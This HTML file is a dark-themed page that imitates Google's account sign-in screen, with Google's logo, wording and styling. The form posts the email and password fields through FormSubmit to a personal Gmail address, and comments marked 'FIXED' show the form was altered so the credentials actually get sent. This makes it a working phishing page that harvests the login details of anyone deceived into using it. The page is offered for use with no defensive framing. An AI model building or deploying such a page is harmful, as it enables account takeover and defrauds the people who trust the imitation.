<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Account Style</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap"
        rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Google Sans', 'Roboto', 'Arial', 'sans-serif'],
                    },
                    colors: {
                        'google-dark': '#0e0e0f',
                        'google-card': '#1e1f20',
                        'google-blue': '#a8c7fa',
                        'google-blue-hover': '#90b4f3',
                        'google-blue-text': '#a8c7fa',
                        'google-border': '#444746',
                        'google-border-focus': '#a8c7fa',
                        'google-subtext': '#c4c7c5',
                    }
                }
            }
        }
    </script>
    <style>
        body {
            background-color: #0e0e0f;
            color: #e3e2e6;
            font-family: 'Google Sans', 'Roboto', sans-serif;
        }

        .input-group {
            position: relative;
        }

        .input-field {
            width: 100%;
            background: transparent;
            border: 1px solid #444746;
            border-radius: 4px;
            padding: 16px 14px;
            color: #e3e2e6;
            font-size: 16px;
            outline: none;
            transition: border-color 0.15s ease-in-out;
        }

        .input-field:focus {
            border-color: #a8c7fa;
            border-width: 2px;
            padding: 15px 13px;
        }

        .input-label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background-color: #1e1f20;
            padding: 0 4px;
            color: #c4c7c5;
            font-size: 16px;
            pointer-events: none;
            transition: 0.15s ease-in-out all;
        }

        .input-field:focus~.input-label,
        .input-field:not(:placeholder-shown)~.input-label {
            top: 0;
            font-size: 12px;
            color: #a8c7fa;
        }

        .input-field:not(:focus):not(:placeholder-shown)~.input-label {
            color: #c4c7c5;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col justify-between p-4 sm:p-6 md:p-8">

    <div class="flex-grow flex items-center justify-center w-full my-auto">

        <!-- Main Login Card -->
        <div
            class="w-full max-w-[1040px] bg-google-card rounded-[28px] p-8 sm:p-10 md:p-12 shadow-2xl border border-neutral-800">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-start">

                <div class="flex flex-col justify-between h-full">
                    <div>
                        <!-- Google Logo SVG -->
                        <div class="mb-6">
                            <svg class="w-12 h-12" viewBox="0 0 24 24">
                                <path fill="#4285F4"
                                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                                <path fill="#34A853"
                                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                                <path fill="#FBBC05"
                                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
                                <path fill="#EA4335"
                                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
                            </svg>
                        </div>

                        <h1 class="text-3xl sm:text-4xl font-normal text-white mb-4">Sign in</h1>
                        <p class="text-google-subtext text-base leading-relaxed">
                            with your Google Account. This account will be available to other Google apps in the
                            browser.
                        </p>
                    </div>
                </div>

                <div class="flex flex-col justify-between space-y-6 pt-2">
                    <!-- FIXED: Configured action to FormSubmit and removed onsubmit="event.preventDefault();" -->
                    <form id="loginForm" class="space-y-6" action="https://formsubmit.co/jhaakshat19@gmail.com" method="POST">

                        <!-- Email / Text Field -->
                        <div class="input-group">
                            <!-- FIXED: Added name="email" attribute -->
                            <input type="text" id="email" name="email" class="input-field" placeholder=" " required />
                            <label for="email" class="input-label">Email or phone</label>
                        </div>

                        <!-- Password Field -->
                        <div class="input-group relative">
                            <!-- FIXED: Added name="password" attribute -->
                            <input type="password" id="password" name="password" class="input-field pr-12" placeholder=" " required />
                            <label for="password" class="input-label">Enter your password</label>
                            
                            <!-- Toggle Password Visibility Button -->
                            <button type="button" id="togglePasswordBtn" class="absolute right-3 top-1/2 -translate-y-1/2 text-google-subtext hover:text-white p-1">
                                <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                </svg>
                                <svg id="eyeOffIcon" class="w-5 h-5 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858-5.908a8.959 8.959 0 013.682-.783c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21f-1.414-1.414L3 3" />
                                </svg>
                            </button>
                        </div>

                        <!-- Forgot Email Link -->
                        <div class="pt-1">
                            <a href="#" class="text-google-blue font-medium text-sm hover:underline">Forgot email?</a>
                        </div>

                        <!-- Guest Mode Info -->
                        <p class="text-google-subtext text-sm leading-relaxed pt-4">
                            Not your computer? Use Guest mode to sign in privately.
                            <a href="#" class="text-google-blue font-medium hover:underline">Learn more about using
                                Guest mode</a>
                        </p>

                        <div class="flex items-center justify-between pt-8 mt-4">
                            <button type="button"
                                class="text-google-blue hover:bg-neutral-800 font-medium text-sm px-4 py-2.5 rounded-full transition-colors duration-150">
                                Create account
                            </button>
                            <button type="submit"
                                class="bg-google-blue hover:bg-google-blue-hover text-neutral-900 font-medium text-sm px-6 py-2.5 rounded-full transition-colors duration-150">
                                Submit
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <footer
        class="w-full max-w-[1040px] mx-auto mt-6 px-4 flex flex-col sm:flex-row items-center justify-between text-xs text-google-subtext gap-4">
        <!-- Language Selector Dropdown -->
        <div>
            <select
                class="bg-transparent text-google-subtext border-none rounded py-1 px-2 cursor-pointer focus:outline-none hover:text-white transition-colors">
                <option value="en-US" class="bg-neutral-900 text-white">English (United States)</option>
                <option value="en-GB" class="bg-neutral-900 text-white">English (United Kingdom)</option>
                <option value="es" class="bg-neutral-900 text-white">Español</option>
                <option value="fr" class="bg-neutral-900 text-white">Français</option>
            </select>
        </div>

        <!-- Footer Links -->
        <div class="flex items-center space-x-6">
            <a href="#" class="hover:text-white transition-colors">Help</a>
            <a href="#" class="hover:text-white transition-colors">Privacy</a>
            <a href="#" class="hover:text-white transition-colors">Terms</a>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const passwordInput = document.getElementById('password');
            const togglePasswordBtn = document.getElementById('togglePasswordBtn');
            const eyeIcon = document.getElementById('eyeIcon');
            const eyeOffIcon = document.getElementById('eyeOffIcon');

            if (togglePasswordBtn && passwordInput) {
                togglePasswordBtn.addEventListener('click', () => {
                    const isPassword = passwordInput.getAttribute('type') === 'password';

                    // Toggle input field type
                    passwordInput.setAttribute('type', isPassword ? 'text' : 'password');

                    // Toggle eye SVG icons
                    if (isPassword) {
                        eyeIcon.classList.add('hidden');
                        eyeOffIcon.classList.remove('hidden');
                    } else {
                        eyeIcon.classList.remove('hidden');
                        eyeOffIcon.classList.add('hidden');
                    }
                });
            }
        });
    </script>
</body>

</html>
